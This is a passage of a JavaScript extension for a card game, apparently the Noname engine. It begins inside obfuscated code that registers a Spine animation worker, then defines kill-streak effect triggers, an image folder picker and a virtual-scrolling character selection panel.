_0x1cb9dc='',_0xf49d7a='',_0x149056=_0x1cb9dc+_0x59e08c;for(let _0x194fa3=0x0,_0x355b1e,_0x4cd423,_0x1e190c=0x0;_0x4cd423=_0x5ce64e['charAt'](_0x1e190c++);~_0x4cd423&&(_0x355b1e=_0x194fa3%0x4?_0x355b1e*0x40+_0x4cd423:_0x4cd423,_0x194fa3++%0x4)?_0x1cb9dc+=_0x149056['charCodeAt'](_0x1e190c+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x355b1e>>(-0x2*_0x194fa3&0x6)):_0x194fa3:0x0){_0x4cd423=_0x399b2e['indexOf'](_0x4cd423);}for(let _0x4cb506=0x0,_0xd24f34=_0x1cb9dc['length'];_0x4cb506<_0xd24f34;_0x4cb506++){_0xf49d7a+='%'+('00'+_0x1cb9dc['charCodeAt'](_0x4cb506)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xf49d7a);};const _0x947988=function(_0x5a106c,_0x5ce3dd){let _0x75ba13=[],_0x6c8a40=0x0,_0x31649d,_0x3a69ff='';_0x5a106c=_0x59e08c(_0x5a106c);let _0x2520d1;for(_0x2520d1=0x0;_0x2520d1<0x100;_0x2520d1++){_0x75ba13[_0x2520d1]=_0x2520d1;}for(_0x2520d1=0x0;_0x2520d1<0x100;_0x2520d1++){_0x6c8a40=(_0x6c8a40+_0x75ba13[_0x2520d1]+_0x5ce3dd['charCodeAt'](_0x2520d1%_0x5ce3dd['length']))%0x100,_0x31649d=_0x75ba13[_0x2520d1],_0x75ba13[_0x2520d1]=_0x75ba13[_0x6c8a40],_0x75ba13[_0x6c8a40]=_0x31649d;}_0x2520d1=0x0,_0x6c8a40=0x0;for(let _0x3a55d2=0x0;_0x3a55d2<_0x5a106c['length'];_0x3a55d2++){_0x2520d1=(_0x2520d1+0x1)%0x100,_0x6c8a40=(_0x6c8a40+_0x75ba13[_0x2520d1])%0x100,_0x31649d=_0x75ba13[_0x2520d1],_0x75ba13[_0x2520d1]=_0x75ba13[_0x6c8a40],_0x75ba13[_0x6c8a40]=_0x31649d,_0x3a69ff+=String['fromCharCode'](_0x5a106c['charCodeAt'](_0x3a55d2)^_0x75ba13[(_0x75ba13[_0x2520d1]+_0x75ba13[_0x6c8a40])%0x100]);}return _0x3a69ff;};a0_0x59e0['XImgAw']=_0x947988,_0x3e3af4=arguments,a0_0x59e0['nsmmId']=!![];}const _0x1e66f1=_0x6437b2[0x0],_0x553176=_0x4f6fe9+_0x1e66f1,_0x50e922=_0x3e3af4[_0x553176];if(!_0x50e922){if(a0_0x59e0['XZOGvL']===undefined){const _0x3d5be4=function(_0x390104){this['nUiRTH']=_0x390104,this['MTJrnx']=[0x1,0x0,0x0],this['uXbCDP']=function(){return'newState';},this['MTCkVj']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['VkQJTi']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x3d5be4['prototype']['TABuIr']=function(){const _0x25fb0b=new RegExp(this['MTCkVj']+this['VkQJTi']),_0x3b8531=_0x25fb0b['test'](this['uXbCDP']['toString']())?--this['MTJrnx'][0x1]:--this['MTJrnx'][0x0];return this['YwsVDv'](_0x3b8531);},_0x3d5be4['prototype']['YwsVDv']=function(_0x53781f){if(!Boolean(~_0x53781f))return _0x53781f;return this['QQpJIo'](this['nUiRTH']);},_0x3d5be4['prototype']['QQpJIo']=function(_0x35abee){for(let _0x48406c=0x0,_0x314a0a=this['MTJrnx']['length'];_0x48406c<_0x314a0a;_0x48406c++){this['MTJrnx']['push'](Math['round'](Math['random']())),_0x314a0a=this['MTJrnx']['length'];}return _0x35abee(this['MTJrnx'][0x0]);},new _0x3d5be4(a0_0x59e0)['TABuIr'](),a0_0x59e0['XZOGvL']=!![];}_0x1b0773=a0_0x59e0['XImgAw'](_0x1b0773,_0xc458dc),_0x3e3af4[_0x553176]=_0x1b0773;}else _0x1b0773=_0x50e922;return _0x1b0773;},a0_0x59e0(_0x3e3af4,_0x32f908);}(function(_0x5d2c08,_0xe08c6c){const a0_0x40429a={_0x119323:0xef,_0x2ab4d7:0x101,_0x4514e6:'SW^B',_0x2b6882:'9rW^',_0x58d01f:0xec,_0x32cd09:0x10a,_0x2cd2d7:0xff,_0x380a1a:'MA6h',_0x3cc442:0x109,_0x4abdf4:'$U)g'},_0x29a44f=a0_0x59e0,_0x50f270=a0_0x1cb9,_0x335d04=_0x5d2c08();while(!![]){try{const _0x3e8f49=-parseInt(_0x50f270(a0_0x40429a._0x119323))/0x1*(parseInt(_0x29a44f(a0_0x40429a._0x2ab4d7,a0_0x40429a._0x4514e6))/0x2)+parseInt(_0x29a44f(0xeb,a0_0x40429a._0x2b6882))/0x3+parseInt(_0x29a44f(0xf1,'9rW^'))/0x4+-parseInt(_0x29a44f(a0_0x40429a._0x58d01f,'%YlH'))/0x5*(parseInt(_0x50f270(a0_0x40429a._0x32cd09))/0x6)+-parseInt(_0x29a44f(a0_0x40429a._0x2cd2d7,a0_0x40429a._0x380a1a))/0x7+-parseInt(_0x50f270(0xf3))/0x8+parseInt(_0x29a44f(a0_0x40429a._0x3cc442,a0_0x40429a._0x4abdf4))/0x9;if(_0x3e8f49===_0xe08c6c)break;else _0x335d04['push'](_0x335d04['shift']());}catch(_0x3c31e5){_0x335d04['push'](_0x335d04['shift']());}}}(a0_0x1b07,0xa7967));const a0_0xd24f34=(function(){let _0x5ce3dd=!![];return function(_0x75ba13,_0x6c8a40){const _0x31649d=_0x5ce3dd?function(){const _0x19da2b=a0_0x1cb9;if(_0x6c8a40){const _0x3a69ff=_0x6c8a40[_0x19da2b(0x10f)](_0x75ba13,arguments);return _0x6c8a40=null,_0x3a69ff;}}:function(){};return _0x5ce3dd=![],_0x31649d;};}()),a0_0x5a106c=a0_0xd24f34(this,function(){const a0_0x339a87={_0x5334ff:0x10c,_0x39d997:'VFbV',_0x41438a:0xe8,_0x19d965:'QU^3',_0x4b4a18:0x110,_0x4b4fa1:'SW^B'},_0x311eee=a0_0x59e0,_0x1160d6=a0_0x1cb9;return a0_0x5a106c['toString']()[_0x1160d6(a0_0x339a87._0x5334ff)](_0x311eee(0x111,a0_0x339a87._0x39d997))[_0x311eee(a0_0x339a87._0x41438a,a0_0x339a87._0x19d965)]()[_0x311eee(a0_0x339a87._0x4b4a18,a0_0x339a87._0x4b4fa1)](a0_0x5a106c)['search']('(((.+)+)+)+$');});a0_0x5a106c(),Object['assign'](lib,{'qyWorkerSpine'(_0x2520d1={},_0x3a55d2=function(_0x48406c,_0x314a0a){},_0x3d5be4,_0x390104=qyWorkerAction['PLAY_SPINE']){const a0_0x244fee={_0x5659af:0xf7,_0x1730d8:0xf8,_0x3949de:'SW^B',_0x5e6d73:0xf7,_0x5ba8ed:0x10d,_0x35e387:'[)Qc',_0x562b44:0xfd,_0x3b2c0b:0xe6,_0x42b9e9:'$8OK',_0x4a9d4f:0x10e,_0x5f0b2d:0xe7,_0x4a66e8:0x105,_0x30f6a9:'VFbV'},a0_0x4f2715={_0x460fd9:0xfc,_0x2f0e5d:0xee,_0x2dc0af:'%3kI',_0x2e897e:0xfd,_0x4f1fe1:0xf9,_0x2febdd:'QU^3',_0x174f15:0xf0,_0x438248:'i6dD',_0x4f55e1:'u744',_0x31bcc4:0xf5,_0xe6443e:0x100,_0x5990a2:0xf6,_0x2008c2:0x10b},a0_0x3833c6={_0x1d4d66:0xfe,_0x268799:0x104},_0x23399f=a0_0x59e0,_0x35970a=a0_0x1cb9,{name:_0x25fb0b,uuid:uuid=qyAnimationUtil['generatorUUID']()}=_0x2520d1;if(!_0x2520d1[_0x35970a(a0_0x244fee._0x5659af)])_0x2520d1[_0x23399f(a0_0x244fee._0x1730d8,a0_0x244fee._0x3949de)]=[];_0x2520d1[_0x35970a(0x104)]=_0x390104,_0x2520d1[_0x35970a(a0_0x244fee._0x5e6d73)][_0x23399f(a0_0x244fee._0x5ba8ed,a0_0x244fee._0x35e387)]({'complete':function(){postMessageValue(this.id, this.position.qyWorkerAction, 'complete', null);}});let _0x3b8531;if(typeof _0x3d5be4===_0x35970a(a0_0x244fee._0x562b44))_0x3b8531=_0x3d5be4,lib['qyWebWorkerMessage']['once'](uuid,_0x390104,_0x3b8531);else{if(lib['qyUtils']['isObject'](_0x3d5be4)){const _0x350b39=new Map();for(let [_0x14e8b2,_0x2553fc]of Object[_0x23399f(a0_0x244fee._0x3b2c0b,a0_0x244fee._0x42b9e9)](_0x3d5be4)){_0x350b39[_0x35970a(a0_0x244fee._0x4a9d4f)](_0x14e8b2,_0x2553fc);}lib['qyWebWorkerMessage']['on'](uuid,_0x390104,function(_0x219ae6,_0x4f02bf){const a0_0x3dd26a={_0x5653aa:0xe9,_0x42a4f8:'hef[',_0x1a3914:0xf4,_0x45d851:'9!o9',_0x510ec6:0xea},_0x2072f7=_0x23399f,_0x45f554=_0x35970a;if(!_0x350b39[_0x45f554(a0_0x4f2715._0x460fd9)](_0x219ae6))return;const _0x35abf6=(_0x462a10,_0x9c26a4)=>{const _0x13605f=_0x45f554,_0x3345c0=a0_0x59e0;if(typeof _0x462a10===_0x3345c0(a0_0x3dd26a._0x5653aa,a0_0x3dd26a._0x42a4f8))_0x462a10(_0x219ae6,_0x4f02bf);else{if(lib[_0x3345c0(0x108,'%YlH')][_0x3345c0(a0_0x3dd26a._0x1a3914,a0_0x3dd26a._0x45d851)](_0x462a10)){const {once:once=![],fn:fn=function(){}}=_0x462a10,_0x1ac33d=fn(_0x219ae6,_0x4f02bf);_0x1ac33d!==![]&&once&&(Array['isArray'](_0x291357)?_0x291357[_0x13605f(a0_0x3dd26a._0x510ec6)](_0x9c26a4,0x1):_0x350b39[_0x3345c0(0xfb,'PSVY')](_0x219ae6));}}},_0x291357=_0x350b39[_0x2072f7(a0_0x4f2715._0x2f0e5d,a0_0x4f2715._0x2dc0af)](_0x219ae6);if(typeof _0x291357===_0x45f554(a0_0x4f2715._0x2e897e)||lib[_0x2072f7(a0_0x4f2715._0x4f1fe1,a0_0x4f2715._0x2febdd)]['isObject'](_0x291357))_0x35abf6(_0x291357);else{if(Array['isArray'](_0x291357)){for(let _0x4e72d1=0x0;_0x4e72d1<_0x291357[_0x2072f7(a0_0x4f2715._0x174f15,a0_0x4f2715._0x438248)];_0x4e72d1++){_0x35abf6(_0x291357[_0x4e72d1],_0x4e72d1);}!_0x291357[_0x2072f7(0x106,a0_0x4f2715._0x4f55e1)]&&_0x350b39[_0x45f554(a0_0x4f2715._0x31bcc4)](_0x219ae6);}}_0x350b39[_0x2072f7(a0_0x4f2715._0xe6443e,'M@u6')]===0x0&&(_0x350b39[_0x2072f7(a0_0x4f2715._0x5990a2,'$U)g')](),lib[_0x45f554(0xfa)][_0x45f554(a0_0x4f2715._0x2008c2)](uuid,_0x390104));});}}const _0x53781f=qyAnimationUtil[_0x35970a(a0_0x244fee._0x5f0b2d)](),_0x35abee={};_0x35abee['action']=_0x390104,_0x35abee[_0x35970a(0x107)]=_0x53781f,_0x35abee[_0x35970a(0x102)]=_0x3a55d2,JzwdWebWorkerOrMainWorker(lib[_0x23399f(a0_0x244fee._0x4a66e8,a0_0x244fee._0x30f6a9)],_0x25fb0b,_0x2520d1,uuid,_0x35abee);}});

    // 手杀连斩
    function qyShoushaJisha() {
        //此代码已经完全独立重写
        lib.skill._qyshousha_jisha = {
            trigger: {
                player: ['_qyshousha_jisha', 'qy_diankuangtulu', 'qy_wanjunqushou', 'qy_yishugaochao', 'qy_miaoshouhuichun']
            },
            charlotte: true,
            forced: true,
            popup: false,
            silent: true,
            priority: 2021,
            content: function () {
                let delay = 2;
                if (trigger.triggername !== '_qyshousha_jisha') {
                    delay += 0.5
                }
                game.delay(delay);
            },
        }
        lib.skill._qyshousha_jisha2 = {
            trigger: {
                source: "dieBegin",
            },
            forced: true,
            charlotte: true,
            locked: true,
            popup: false,
            silent: true,
            unique: true,
            filter(event, player) {
                return game.getExtensionConfig('假装无敌', 'qingyao_shoushatexiao');
            },
            priority: Infinity,
            content: function () {
                if (!player.storage._qyshousha_jisha2) player.storage._qyshousha_jisha2 = 0;
                player.storage._qyshousha_jisha2++;
                player.markSkill('_qyshousha_jisha2');
                player.syncStorage('_qyshousha_jisha2');
                player.update();
                //需要还原本局游戏只触发一次“一破”特效，添加此注释
                //if(!_status.qyshousha_jisha && player.storage._qyshousha_jisha2 == 1){
                event.trigger('_qyshousha_jisha');
                //}
            },
            //需要标记的话添加以下注释
            /*marktext:"杀",
            intro:{
                name:'击杀人数',
                content:function (storage){
                    return '你已击杀'+storage+'名角色';
                },
            },*/
        }
        lib.skill._qy_ChangeHp = {
            trigger: {
                player: ['changeHp'],
            },
            filter: function (event, player) {
                if (!game.getExtensionConfig('假装无敌', 'qingyao_shoushatexiao')) return false;
                return event.getParent().source && ((['清瑶recover', 'recover'].contains(event.getParent().name) && event.num > 0) || (['清瑶Damage', 'damage'].contains(event.getParent().name) && event.num <= -3));
            },
            direct: true,
            popup: false,
            silent: true,
            firstDo: true,
            content: function () {
                if (trigger.num > 0) {
                    if (trigger.getParent().source != player && !trigger.getParent().player.isDying() && trigger.getParent('dying').name == 'dying') {
                        if (trigger.getParent().source.storage.qy_miaoshouhuichun == undefined) {
                            trigger.getParent().source.storage.qy_miaoshouhuichun = 1;
                        } else {
                            trigger.getParent().source.storage.qy_miaoshouhuichun += 1;
                        }
                        if (trigger.getParent().source.storage.qy_miaoshouhuichun >= 3) {
                            delete trigger.getParent().source.storage.qy_miaoshouhuichun;
                            event.trigger('qy_miaoshouhuichun');
                        }
                    }
                    if (trigger.getParent().player.isAlive()) {
                        //if(_status.currentPhase == player) {
                        if (trigger.getParent().player.storage.qy_yishugaochao == undefined) {
                            trigger.getParent().player.storage.qy_yishugaochao = trigger.num;
                        } else {
                            trigger.getParent().player.storage.qy_yishugaochao += trigger.num;
                        }
                        if (trigger.getParent().player.storage.qy_yishugaochao >= 3) {
                            delete trigger.getParent().player.storage.qy_yishugaochao;
                            event.trigger('qy_yishugaochao');
                        }
                        //}
                    }
                } else if (trigger.num <= -3) {
                    if (trigger.num == -3) {
                        event.trigger('qy_diankuangtulu');
                    } else {
                        event.trigger('qy_wanjunqushou');
                    }
                }
            },
        };
        lib.skill._qy_deleteother = {
            trigger: {
                global: 'phaseAfter',
            },
            direct: true,
            popup: false,
            silent: true,
            content: function () {
                delete player.storage.qy_yishugaochao;
                //添加以下注释击杀特效仅统计一回合内
                //delete player.storage._qyshousha_jisha2;
                //delete player.storage.qy_yishugaochao;
            },
        };
        lib.skill._qy_onDead = {
            trigger: {
                player: ['dieBegin', 'die'],
            },
            priority: 523,
            forced: true,
            silent: true,
            popup: false,
            filter: function (trigger, player, event) {
                return !event._qy_onDead;
            },
            content: function () {
                trigger._qy_onDead = true;
                event.trigger('qy_dead');
            },
        };
    }

    // 手杀连斩
    lib.qyArenaReadyPushOrRunStart(qyShoushaJisha);


    // 初始化设置
    let qingyaoHandKilling = game.getExtensionConfig('假装无敌', 'qingyaoHandKilling');
    if (!(qingyaoHandKilling instanceof globalThis.Object)) {
        game.saveExtensionConfig('假装无敌', 'qingyaoHandKilling', {
            outcrop: true,
        });
        qingyaoHandKilling = game.getExtensionConfig('假装无敌', 'qingyaoHandKilling');
    }

    // 武将面板
    lib.qyArenaReadyPushOrRunStart(() => {

        lib.chooseFileFolders = function (callback) {
            const dialog = ui.create.dialog('hidden', '请选择目录', 'forcebutton', true);
            dialog.classList.add('scroll1', 'scroll2', 'fixed', 'static');
            ui.window.appendChild(dialog);
            dialog.css({
                width: '80vw',
                left: '50%',
                transform: 'translate3d(-50%,0,0)',
                zIndex: 99,
            });

            const path = [];
            let currentFolders = [];
            const currentSelected = [];
            const settingButton = ui.create.div('.menubutton.highlight.qymenubutton', '使用此文件夹', {
                bottom: '70px',
            }, dialog);
            settingButton.type = 'folder'
            settingButton.addEventListener('click', function (event) {
                typeof callback === 'function' && callback.call(this, currentSelected, currentFolders, path, path.join("/"));
            });
            ui.create.div('.menubutton.highlight.qymenubutton', '取消', dialog, event => {
                dialog.delete(200);
            });
            const enterDirectory = function (path) {
                dialog.content.innerHTML = '';
                if (path.length > 0) {
                    const back = dialog.add(`<div class="menubutton highlight popup text center qypopup">返回上一级目录</div>`);
                    back.firstChild.addEventListener('click', function () {
                        path.pop();
                        enterDirectory(path);
                    })
                }
                game.getFileList(path.join("/"), (folders, files) => {
                    const documentFragment = document.createDocumentFragment();
                    currentFolders = folders;
                    for (let folder of folders) {
                        const item = ui.create.div('.caption.popup.text.center.qypopup', `<span>📁${folder}</span>`);
                        item.link = folder;
                        item.addEventListener('click', function () {
                            path.push(this.link);
                            enterDirectory(path);
                        })
                        documentFragment.appendChild(item);
                    }
                    for (let file of files.filter(item => item.match(/\.jpg$|\.webp$|\.png$|\.jpeg$|\.gif$/i) !== null)) {
                        const item = ui.create.div('caption.popup.text.center.qypopup', `<span>${file}</span>`);
                        item.classList.add('popup', 'text', 'center', 'qypopup');
                        item.link = file;
                        item.path = path.join("/") + '/' + file;
                        item.addEventListener('click', function () {
                            this.classList.toggle('thundertext');
                            if (this.classList.contains('thundertext')) {
                                if (!this.previewnode) {
                                    this.previewnode = ui.create.div(this, '.text.center', {
                                        width: '100%',
                                        position: 'relative',
                                    });
                                    const img = document.createElement('img');
                                    img.src = lib.assetURL + this.path;
                                    img.width = '80';
                                    img.style.maxHeight = '160px';
                                    this.previewnode.appendChild(img);
                                    currentSelected.add(this.path);
                                }
                            } else {
                                if (this.previewnode) {
                                    this.previewnode.remove();
                                    delete this.previewnode;
                                    currentSelected.remove(this.path);
                                }
                            }
                            if (currentSelected.length > 0) {
                                settingButton.type = 'file';
                                settingButton.innerHTML = `当前已选择【${currentSelected.length}】个文件`;
                            } else {
                                settingButton.type = 'folder';
                                settingButton.innerHTML = '使用此文件夹';
                            }

                        });
                        if (currentSelected.contains(item.path)) {
                            item.click();
                        }
                        documentFragment.appendChild(item);
                    }
                    dialog.content.appendChild(documentFragment);
                });
            }
            enterDirectory(path);
        }
        const displayMode = qingyaoHandKilling.displayMode;
        if (displayMode === 'off') return;

        const clickCharacter = function (body) {
            const createElement = lib.qyUtils.createElement;

            // 虚拟滚动条类
            class VirtualCharacterScroll {
                constructor(container, options = {}) {
                    this.container = container;
                    this.viewport = null;
                    this.scrollContent = null;

                    // 配置选项
                    this.options = {
                        buffer: 2, // 缓冲行数
                        gap: 15, // 间距
                        estimatedItemWidth: 140, // 估计项目宽度
                        estimatedItemHeight: 200, // 估计项目高度
                        itemsPerRow: 0, // 每行项目数，会自动计算
                        renderCharacterItem: null, // 自定义渲染函数
                        ...options
                    };

                    // 数据和状态
                    this.originalData = []; // 原始数据 [{id, characterPackElement}, ...]
                    this.filteredData = []; // 过滤后的数据
                    this.filterFunctions = []; // 过滤函数数组

                    // 布局相关
                    this.rowData = []; // 按行组织的数据
                    this.rowHeight = this.options.estimatedItemHeight + this.options.gap; // 固定行高
                    this.containerWidth = 0;
                    this.visibleRowStart = 0;
                    this.visibleRowEnd = 0;

                    // 缓存状态，避免不必要的重绘
                    this.lastVisibleRange = { startRow: -1, endRow: -1 };
                    this.lastScrollTop = 0; // 缓存上次滚动位置
                    this.scrollThreshold = this.rowHeight * 0.5; // 滚动阈值，滚动超过半行高度才检查重绘
                    this.isRendering = false; // 防止重复渲染
                    this.pendingRender = false; // 是否有待处理的渲染请求

                    // 增量渲染相关状态
                    this.renderedRows = new Map(); // 已渲染的行容器 Map<rowIndex, rowElement>
                    this.forceFullRender = false; // 是否强制全量渲染

                    this.init();
                }

                init() {
                    this.createVirtualContainer();
                    this.bindEvents();
                }

                createVirtualContainer() {
                    // 创建虚拟滚动容器
                    this.scrollContent = createElement({
                        style: {
                            width: '100%',
                            height: '100%',
                            overflow: 'auto',
                            position: 'relative'
                        },
                        parent: this.container
                    });

                    // 创建视口
                    this.viewport = createElement({
                        style: {
                            position: 'relative',
                            width: '100%'
                        },
                        parent: this.scrollContent
                    });
                }

                bindEvents() {
                    this.scrollContent.addEventListener('scroll', lib.qyUtils.throttle(this.handleScroll.bind(this), 16));
                    window.addEventListener('resize', lib.qyUtils.throttle(this.handleResize.bind(this), 100));
                }

                // 设置原始数据
                setData(characterPack) {
                    this.originalData = Object.entries(characterPack).filter(([characterId, characterPackElement]) => {
                        if (!characterPackElement) return false;
                        return !characterPackElement[4]?.includes('unseen');
                    });
                    this.applyFilters();
                }

                // 添加过滤函数
                addFilterFunction(filterFn) {
                    this.filterFunctions.push(filterFn);
                }

                // 清空过滤函数
                clearFilterFunctions() {
                    this.filterFunctions = [];
                }

                // 应用过滤条件
                applyFilters() {
                    this.filteredData = this.originalData.filter(([characterId, characterPackElement]) => {
                        const character = {
                            name: characterId,
                            link: characterId,
                            group: characterPackElement[1],
                            ...characterPackElement
                        };

                        return this.filterFunctions.every(filterFn => filterFn(character));
                    });

                    // 重置缓存状态，确保数据变化时能正确重绘
                    this.lastVisibleRange = { startRow: -1, endRow: -1 };
                    this.renderedRows.clear(); // 清空已渲染行缓存
                    this.forceFullRender = true; // 强制全量渲染
                    this.calculateLayout();
                    this.render();
                }

                // 计算布局
                calculateLayout() {
                    this.containerWidth = this.container.offsetWidth || this.container.clientWidth;
                    if (this.containerWidth === 0) return;

                    // 计算每行可以放置的项目数
                    const availableWidth = this.containerWidth - this.options.gap * 2; // 减去左右边距
                    this.options.itemsPerRow = Math.max(1, Math.floor((availableWidth + this.options.gap) / (this.options.estimatedItemWidth + this.options.gap)));

                    // 计算总行数
                    this.totalRows = Math.ceil(this.filteredData.length / this.options.itemsPerRow);

                    // 按行组织数据
                    this.rowData = [];
                    for (let i = 0; i < this.totalRows; i++) {
                        const startIndex = i * this.options.itemsPerRow;
                        const endIndex = Math.min(startIndex + this.options.itemsPerRow, this.filteredData.length);
                        this.rowData.push(this.filteredData.slice(startIndex, endIndex));
                    }
                }

                // 获取总高度
                getTotalHeight() {
                    return this.totalRows * this.rowHeight + this.options.gap;
                }

                // 获取可见行范围
                getVisibleRowRange() {
                    if (this.totalRows === 0) {
                        return { startRow: 0, endRow: 0 };
                    }

                    const scrollTop = this.scrollContent.scrollTop;
                    const containerHeight = this.scrollContent.clientHeight;

                    const startRow = Math.max(0, Math.floor(scrollTop / this.rowHeight) - this.options.buffer);
                    const endRow = Math.min(this.totalRows - 1, Math.ceil((scrollTop + containerHeight) / this.rowHeight) + this.options.buffer);

                    return { startRow, endRow };
                }

                // 处理滚动事件
                handleScroll() {
                    const currentScrollTop = this.scrollContent.scrollTop;

                    // 只有滚动距离超过阈值时才检查重绘，减少不必要的计算
                    if (Math.abs(currentScrollTop - this.lastScrollTop) >= this.scrollThreshold || this.pendingRender) {
                        this.lastScrollTop = currentScrollTop;
                        this.render();
                    }
                }

                // 处理窗口大小变化
                handleResize() {
                    this.calculateLayout();
                    this.render();
                }

                // 创建武将项目
                createCharacterItem(characterId, characterPackElement, index) {
                    if (this.options.renderCharacterItem) {
                        return this.options.renderCharacterItem(characterId, characterPackElement, index);
                    }

                    const rank = lib.rank ? game.getRarity(characterId) : null;
                    const group = characterPackElement[1];

                    const character = createElement({
                        class: `qy_character qy_character_${group} character`,
                        props: {
                            group: group,
                            link: characterId,
                            name: characterId
                        },
                        style: {
                            width: this.options.estimatedItemWidth + 'px',
                            height: this.options.estimatedItemHeight + 'px',
                            margin: (this.options.gap / 2) + 'px',
                            flex: 'none'
                        }
                    });

                    // 创建武将头像
                    const primaryAvatar = createElement({
                        class: 'qy_primary-avatar character',
                        parent: character,
                        props: { link: characterId }
                    });

                    // 设置背景和事件
                    primaryAvatar.setBackground(characterId, 'character');

                    if (get.character(characterId)) {
                        lib.qyUtils.listen(primaryAvatar, function () {
                            ui.click.qycharactercard(this.link, this)
                                .catch(err => {
                                    console.error(err);
                                    alert('primaryAvatar，武将资料页打开失败：' + err);
                                });
                        });
                    }

                    if (lib.character[characterId]) {
                        lib.setIntro(primaryAvatar);
                    }

                    // 武将边框
                    createElement({
                        class: `qy_character_border qy_character_border_${rank}`,
                        parent: character
                    });

                    // 处理未开启武将的图片
                    if (!lib.character[characterId] && characterPackElement[4]) {
                        const findExtIndex = characterPackElement[4].findIndex(item =>
                            typeof item === 'string' && item.includes('ext:')
                        );
                        if (findExtIndex !== -1) {
                            primaryAvatar.setBackgroundImage(
                                characterPackElement[4][findExtIndex].replace(/ext:/, 'extension/')
                            );
                        }
                    }

                    // 武将名称
                    createElement({
                        class: 'qy_name',
                        innerHTML: get.translation(characterId),
                        parent: character
                    });

                    // 星级容器
                    const qy_xing_container = createElement({
                        class: 'qy_xing_container',
                        parent: character
                    });

                    const qyRateNum = get.qyRateNum(characterId);

                    // 灰星
                    for (let i = 0; i < 5 - qyRateNum; i++) {
                        createElement({
                            class: 'qy_xing qy_xing_gray',
                            parent: qy_xing_container
                        });
                    }

                    // 亮星
                    for (let num = 0; num < qyRateNum; num++) {
                        createElement({
                            class: 'qy_xing qy_xing_light',
                            parent: qy_xing_container
                        });
                    }

                    // 稀有度标签
                    if (rank) {
                        createElement({
                            class: `qy_rank_label qy_rank_label_${rank}`,
                            parent: character
                        });
                    }

                    return character;
                }

                // 渲染
                render() {
                    // 防止重复渲染
                    if (this.isRendering) {
                        this.pendingRender = true;
                        return;
                    }

                    if (this.filteredData.length === 0) {
                        this.viewport.innerHTML = '<div style="text-align: center; padding: 50px; color: #999;">没有找到匹配的武将</div>';
                        this.lastVisibleRange = { startRow: -1, endRow: -1 };
                        this.renderedRows.clear();
                        return;
                    }

                    const { startRow, endRow } = this.getVisibleRowRange();

                    // 检查可见范围是否发生变化，避免不必要的重绘
                    if (startRow === this.lastVisibleRange.startRow &&
                        endRow === this.lastVisibleRange.endRow &&
                        !this.pendingRender && !this.forceFullRender) {
                        return; // 没有变化，不需要重绘
                    }

                    this.isRendering = true;
                    this.pendingRender = false;

                    // 使用 requestAnimationFrame 优化渲染时机
                    requestAnimationFrame(() => {
                        try {
                            // 设置容器总高度
                            const totalHeight = this.getTotalHeight();
                            this.viewport.style.height = totalHeight + 'px';

                            if (this.forceFullRender) {
                                // 强制全量渲染（数据变化时）
                                this.renderFullContent(startRow, endRow);
                                this.forceFullRender = false;
                            } else {
                                // 增量渲染（滚动时）
                                this.renderIncremental(startRow, endRow);
                            }

                            // 更新缓存状态
                            this.lastVisibleRange = { startRow, endRow };
                            this.visibleRowStart = startRow;
                            this.visibleRowEnd = endRow;

                        } finally {
                            this.isRendering = false;

                            // 如果有待处理的渲染请求，递归调用
                            if (this.pendingRender) {
                                this.render();
                            }
                        }
                    });
                }

                // 全量渲染（数据变化时使用）
                renderFullContent(startRow, endRow) {
                    // 清空视口和缓存
                    this.viewport.innerHTML = '';
                    this.renderedRows.clear();

                    // 渲染所有可见行
                    for (let rowIndex = startRow; rowIndex <= endRow && rowIndex < this.totalRows; rowIndex++) {
                        const rowElement = this.createRowElement(rowIndex);
                        if (rowElement) {
                            this.viewport.appendChild(rowElement);
                            this.renderedRows.set(rowIndex, rowElement);
                        }
                    }
                }

                // 增量渲染（滚动时使用）
                renderIncremental(startRow, endRow) {
                    const { startRow: lastStart, endRow: lastEnd } = this.lastVisibleRange;

                    // 移除不再可见的行
                    this.renderedRows.forEach((rowElement, rowIndex) => {
                        if (rowIndex < startRow || rowIndex > endRow) {
                            rowElement.remove();
                            this.renderedRows.delete(rowIndex);
                        }
                    });

                    // 添加新出现的行
                    for (let rowIndex = startRow; rowIndex <= endRow && rowIndex < this.totalRows; rowIndex++) {
                        if (!this.renderedRows.has(rowIndex)) {
                            const rowElement = this.createRowElement(rowIndex);
                            if (rowElement) {
                                this.viewport.appendChild(rowElement);
                                this.renderedRows.set(rowIndex, rowElement);
                            }
                        }
                    }
                }

                // 创建行元素
                createRowElement(rowIndex) {
                    const rowItems = this.rowData[rowIndex];
                    if (!rowItems || rowItems.length === 0) return null;

                    const rowContainer = createElement({
                        style: {
                            position: 'absolute',
                            top: (rowIndex * this.rowHeight + this.options.gap) + 'px',
                            left: '0',
                            right: '0',
                            height: this.options.estimatedItemHeight + 'px',
                            display: 'flex',
                            flexWrap: 'nowrap',
                            justifyContent: 'flex-start',
                            alignItems: 'flex-start',
                            paddingLeft: this.options.gap + 'px',
                            paddingRight: this.options.gap + 'px'
                        }
                    });

                    rowItems.forEach(([characterId, characterPackElement], itemIndex) => {
                        const character = this.createCharacterItem(characterId, characterPackElement, rowIndex * this.options.itemsPerRow + itemIndex);
                        rowContainer.appendChild(character);
                    });

                    return rowContainer;
                }

                // 刷新数据
                refresh() {
                    this.applyFilters();
                }

                // 销毁
                destroy() {
                    if (this.scrollContent && this.scrollContent.parentNode) {
                        this.scrollContent.parentNode.removeChild(this.scrollContent);
                    }
                }
            }

            // 主容器
            const qy_chess_container = createElement({
                class: 'qy_chess_container',
                parent: body,
                event: {
                    click: event => event.stopPropagation(),
                    touchstart: event => event.stopPropagation()
                },
                dataset: {
                    qingyaoHandKillingOutcrop: qingyaoHandKilling.outcrop
                }
            });

            // 筛选武将过滤器
            const filterFunction = [];

            // 状态变量
            let __qy_btn_btn_current = null;
            let __qy_chess_right_container = null;
            let __qy_right_group_current = null;
            let __qy_pub_character_container = null;
            let virtualScroll = null; // 虚拟滚动实例

            /** **************************** 构造左边的武将包信息 --- start --- *****************************/
            const qy_btn_btn_left_container = createElement({
                class: 'qy_btn_btn_left_container',
                parent: qy_chess_container
            });

            // 获取所有武将数据
            const allCharacter = {};
            Object.keys(lib.characterPack).forEach(item => {
                Object.assign(allCharacter, lib.characterPack[item]);
            });

            // 创建全部/热门按钮容器
            const qy_btn_btn_bg_container = createElement({
                class: 'qy_btn_btn_bg_container',
                parent: qy_btn_btn_left_container
            });

            const qy_btn_btn_bg_list = ['热门', '全部'];

